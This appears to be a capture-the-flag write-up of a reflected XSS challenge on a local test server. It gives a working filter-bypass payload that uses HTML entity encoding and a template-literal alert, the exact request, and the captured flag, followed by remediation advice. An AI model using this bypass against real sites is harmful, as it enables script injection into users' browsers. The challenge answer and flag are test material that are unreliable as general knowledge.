## TL;DR
- Objective: Execute XSS with 'XSS' (capital) in the alert string
- Outcome: ACHIEVED - XSS successfully executed and FLAG captured
- Highest-impact finding: Reflected XSS via parser differential vulnerability using HTML entity encoding combined with JavaScript template literal syntax
- Validation status: Confirmed with FLAG retrieval

## Target Information
- Target: 127.0.0.1:32953
- Host / base URL: http://127.0.0.1:32953
- Application or component: XSS Level 20 Challenge
- Authentication context: Unauthenticated
- Relevant technology details: HTML filtering application with character-based input validation

## Confirmed Vulnerability
### Cross-Site Scripting (XSS) via HTML Entity Encoding Bypass and JavaScript Template Literals
- Affected endpoint / component: `/page?name=` parameter reflected in `<img src="INPUT">` attribute
- Impact: Arbitrary JavaScript execution in victim's browser context
- Preconditions: 
  - User visits crafted malicious URL
  - Application reflects `name` parameter unescaped in image `src` attribute
  - Application filters raw input for `<`, `=`, `(` characters
- Exact payload or PoC:
  ```
  "onerror="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert&#96;XSS&#96;
  ```
  Decoded by browser to: `"onerror="javascript:alert`XSS``

## Steps to Reproduce
1. Identify that the `name` parameter is reflected unescaped in `<img src="INPUT">` attribute
2. Observe that raw characters `<`, `=`, `(` are blocked by server-side filters
3. Craft payload using HTML entity encoding to bypass character filters:
   - `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;` = `javascript` (character-by-character numeric entities)
   - `&#96;` = backtick character (bypasses literal backtick filter)
4. Combine with JavaScript template literal syntax `alert`XSS`` to execute function without parentheses
5. Send request with payload: `GET /page?name=%22onerror%3D%22%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%3Aalert%26%2396%3BXSS%26%2396%3B`
6. Browser decodes entities after server validation, creating parser differential
7. Image fails to load, triggering `onerror` event which executes `javascript:alert`XSS`` via template literal syntax

## Validation / Evidence
- Validation token / flag: `FLAG{61b5ff268074479ca56dbfd7dbb6e455a77681cfc366b35a48b539a50bc9276e}`
- Tool evidence: Successful pattern match for FLAG format in response body
- Request evidence:
  ```
  GET /page?name=%22onerror%3D%22%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%3Aalert%26%2396%3BXSS%26%2396%3B
  ```
- Response evidence:
  ```
  HTTP/1.1 200 OK
  content-type: text/html; charset=utf-8
  x-xss-protection: 0

  solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG{61b5ff268074479ca56dbfd7dbb6e455a77681cfc366b35a48b539a50bc9276e}

  <img src=""onerror="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert&#96;XSS&#96;">
  ```
- Notes on reliability / limitations: The attack requires browser HTML entity decoding. Modern browsers decode entities before JavaScript execution, making this technique reliable across major browsers.

## Remediation
- Root cause: Server-side validation checks only raw input characters, not HTML-entity encoded versions. This creates a parser differential where server validates pre-decoding but browser interprets post-decoding.
- Recommended fix:
  1. Implement proper output encoding/escaping for all dynamic content reflected in HTML attributes
  2. Use context-aware encoding (HTML attribute encoding) rather than character blacklisting
  3. Prefer allowlist approaches over blocklists for input validation
  4. Decode HTML entities before applying validation rules if character filtering must be used
- Defense-in-depth:
  1. Set Content Security Policy (CSP) headers to restrict inline script execution
  2. Implement `X-Content-Type-Options: nosniff` header
  3. Consider using `X-XSS-Protection: 1; mode=block` (currently set to 0 in response)
  4. Use framework-provided templating with automatic escaping

## How to Verify the Fix
1. Submit the original payload: `name=%22onerror%3D%22%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%3Aalert%26%2396%3BXSS%26%2396%3B`
2. Expected secure result: 
   - HTML entities should be properly escaped in output (e.g., `&amp;#106;` instead of `&#106;`)
   - OR validation should decode entities first and reject the malicious pattern
   - Browser should display the literal entity strings without executing JavaScript
   - No alert dialog should appear
   - Response should NOT contain the success message or FLAG

## Remaining Leads
- Confirmed blockers: None - all filters successfully bypassed
- Unverified leads: None - objective fully achieved
- Missing context: None - complete reproduction evidence available
